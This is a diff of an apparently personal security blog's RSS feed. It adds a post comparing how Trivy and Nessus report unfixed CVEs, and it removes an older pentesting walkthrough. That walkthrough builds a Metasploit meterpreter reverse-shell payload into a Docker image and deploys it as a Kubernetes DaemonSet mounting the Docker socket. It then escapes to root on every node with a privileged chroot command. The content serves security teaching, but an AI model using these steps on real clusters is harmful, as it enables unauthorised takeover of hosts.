@@ -7,6 +7,49 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>When is a Vulnerability (possibly) not a vulnerability</title>
+				<description>&lt;p&gt;Over the last couple of months I’ve been looking at container vulnerability scanning a bit (some more info &lt;a href=&quot;https://raesene.github.io/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/&quot;&gt;here&lt;/a&gt;), and there  was one behaviour I noticed that’s probably worth commenting on, as it can be a bit unexpected, and that’s the handling of unfixed vulnerbilities.&lt;/p&gt;
+
+&lt;p&gt;Some Linux distributions (e.g. Debian or Ubuntu) will release information about CVEs for which there is no released patched package, and so you get the question of “should a vulnerability scanner report those?”. On the one hand, it’s good for organizations to know about all their vulnerabilities. On the other hand, from a compliance standpoint, having a large number of unpatchable vulnerabilities can be awkward!&lt;/p&gt;
+
+&lt;p&gt;Whilst this behaviour isn’t unique to containers, I came across it when investigating the differences between the results of different container scanning engines when run against Docker Hub official images. Some tools, for example Nessus and Nexpose would report 0 issues, whilst others, such as Trivy or Clair would report relatively large numbers. As far as I can tell, what’s happening is that Nessus/Nexpose take the approach of not flagging unpatched vulnerabilities where Trivy and Clair default to flagging them.&lt;/p&gt;
+
+&lt;p&gt;I was wondering how to replicate this as Nessus’ container scanning service is not availble for free, however luckily you can use Trivy to scan a Virtual Machine image, so we can test it that way and use the free Nessus Essentials for comparison. For this test, I got an Ubuntu 18.04 server image, updated it fully and ran Nessus and Trivy against it.&lt;/p&gt;
+
+&lt;p&gt;A Nessus scan using credentials to allow patch checking, showed 0 unpatched vulnerabilities. Trivy by default showed 242 vulnerabilities as shown below.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;trivy fs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /
+2020-11-21T21:16:57.492Z        INFO    Detecting Ubuntu vulnerabilities...
+
+trivyubu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ubuntu 18.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=======================&lt;/span&gt;
+Total: 242 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN: 0, LOW: 178, MEDIUM: 64, HIGH: 0, CRITICAL: 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Helpfully, Trivy provides an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--ignore-unfixed&lt;/code&gt; option, which demonstrates that what we’re seeing is unpatched issues, as with that flag we get back 0.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@trivyubu:~/trivy_output&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;trivy fs &lt;span class=&quot;nt&quot;&gt;--ignore-unfixed&lt;/span&gt; /
+2020-11-21T21:17:16.931Z        INFO    Detecting Ubuntu vulnerabilities...
+
+trivyubu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ubuntu 18.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=======================&lt;/span&gt;
+Total: 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;So the question is, which one’s right? I’d say (like most things in security) that depends! For most organizations, you probably don’t want to manually patch and compile packages, so you may want to use a container scanner that supports functionality to ignore unfixed issues. This also gives you comparable scanning to the output you’re likely getting from your Virtual Machine vulnerability scanning efforts.&lt;/p&gt;
+
+&lt;p&gt;For higher risk deployments, you might want to review the package lists and ensure that you’re comfortable leaving those issues unpatched.&lt;/p&gt;
+
+&lt;p&gt;Of course, mitigations like minimizing the number of installed packages and looking at distroless or scratch containers, could also help reduce this kind of problem.&lt;/p&gt;
+</description>
+				<pubDate>Sun, 22 Nov 2020 11:10:39 +0000</pubDate>
+				<link>/blog/2020/11/22/When_Is_A_Vulnerability_Not_A_Vulnerability/</link>
+				<guid isPermaLink="true">/blog/2020/11/22/When_Is_A_Vulnerability_Not_A_Vulnerability/</guid>
+			</item>
+		
+			<item>
 				<title>Container Vulnerability Scanning Fun</title>
 				<description>&lt;p&gt;Vulnerability Assessment is one of those foundational IT Security tasks that often gets overlooked or thought to be reasonably straightforward, where you can actually find some interesting complications that make it trickier than expected.&lt;/p&gt;
 
@@ -687,179 +730,6 @@ runner:x:1001:115:,,,:/home/runner:/bin/bash
 				<pubDate>Sun, 25 Aug 2019 13:10:39 +0100</pubDate>
 				<link>/blog/2019/08/25/shells-in-gh-actions/</link>
 				<guid isPermaLink="true">/blog/2019/08/25/shells-in-gh-actions/</guid>
-			</item>
-		
-			<item>
-				<title>Making it Rain shells in Kubernetes</title>
-				<description>&lt;p&gt;Following on from the &lt;a href=&quot;https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/&quot;&gt;last post&lt;/a&gt; in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.&lt;/p&gt;
-
-&lt;p&gt;The scenario here is that we’ve got the ability to create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemonset&lt;/code&gt; object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.&lt;/p&gt;
-
-&lt;p&gt;To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit Framework&lt;/a&gt; and specifically, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;step-1-create-the-payload&quot;&gt;Step 1: Create the payload&lt;/h2&gt;
-
-&lt;p&gt;We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we’re going to setup and will run on each node in the cluster.&lt;/p&gt;
-
-&lt;p&gt;For this we can run msfvenom to setup our payload and then embed that into a Docker image.&lt;/p&gt;
-
-&lt;p&gt;In this case our pentester machine will be on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.200.1&lt;/code&gt; . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.&lt;/p&gt;
-
-&lt;p&gt;This command will generate our payload&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &amp;gt; reverse_shell.elf
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;setting-up-the-docker-image&quot;&gt;Setting up the Docker Image&lt;/h3&gt;
-
-&lt;p&gt;Next run this command to get the Docker GPG key into your directory&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://download.docker.com/linux/ubuntu/gpg &amp;gt; docker.gpg
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
-
-RUN apt update &amp;amp;&amp;amp; apt install -y apt-transport-https ca-certificates curl software-properties-common
-
-COPY docker.gpg /docker.gpg
-
-RUN apt-key add /docker.gpg
-
-RUN add-apt-repository \
-   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \
-   $(lsb_release -cs) \
-   stable&quot;
-
-RUN apt-get install -y docker-ce-cli
-
-COPY reverse_shell.elf /reverse_shell.elf
-
-RUN chmod +x /reverse_shell.elf
-
-CMD [&quot;/reverse_shell.elf&quot;]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Build it with (replace raesene below with your own docker hub name)&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t raesene/reverse_shell .
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then you can login to Docker hub with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker login&lt;/code&gt; and upload with&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push raesene/reverse_shell
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-2-setting-up-metasploit-to-receive-our-shells&quot;&gt;Step 2: Setting up Metasploit to receive our shells&lt;/h2&gt;
-
-&lt;p&gt;On the pentester machine start-up the metasploit console with&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;then&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and set our variables, in the same way we did with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; earlier&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set payload linux/x64/meterpreter_reverse_http
-set LHOST 192.168.200.1
-set LPORT 8989
-set ExitOnSession false
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With those set, we can start it up to listen for incoming shells&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit -j
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now on a target machine run our shell and we should get that back on the metasploit console&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/reverse_shell
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster&lt;/p&gt;
-
-&lt;h2 id=&quot;step-3-using-a-daemonset-to-compromise-a-cluster&quot;&gt;Step 3: Using a Daemonset to compromise a cluster&lt;/h2&gt;
-
-&lt;p&gt;So we want a workload which will run on every node in the cluster, and that’s exactly what a daemonset will do for us.  We’ll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.&lt;/p&gt;
-
-&lt;p&gt;This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.&lt;/p&gt;
-
-&lt;p&gt;We’ll call our manifest &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell-daemonset.yml&lt;/code&gt; and it should contain this :-&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
-kind: DaemonSet
-metadata:
-  name: reverse-shell-daemonset
-  labels:
-spec:
-  selector:
-    matchLabels:
-      name: reverse-shell-daemonset
-  template:
-    metadata:
-      labels:
-        name: reverse-shell-daemonset
-    spec:
-      tolerations:
-      - key: node-role.kubernetes.io/master
-        effect: NoSchedule
-      containers:
-      - name: revshell
-        image: raesene/reverse-shell
-        volumeMounts:
-        - mountPath: /var/run/docker.sock
-          name: dockersock
-      volumes:
-      - name: dockersock
-        hostPath:
-          path: /var/run/docker.sock
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Once you’ve got your manifest ready, just apply it to the cluster with&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f reverse-shell-daemonset.yml
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Back on your metasploit console you should see your shells pop in, one for each node :)&lt;/p&gt;
-
-&lt;h3 id=&quot;getting-to-root-on-the-nodes&quot;&gt;Getting to root on the nodes&lt;/h3&gt;
-
-&lt;p&gt;So once you’ve got your shells working, you can interact with them from the Metasploit console&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -l 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Will show you your active sessions.  Then&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -i 1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Will let you interact with one of them&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.&lt;/p&gt;
-
-&lt;p&gt;To Do this we can juse make use of the every handy &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;Most Pointless Docker Command Ever&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Running&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and it’ll dump us out to a root shell on the underlying node :)&lt;/p&gt;
-</description>
-				<pubDate>Sat, 10 Aug 2019 07:10:39 +0100</pubDate>
-				<link>/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</link>
-				<guid isPermaLink="true">/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</guid>
 			</item>
 		
 	</channel>
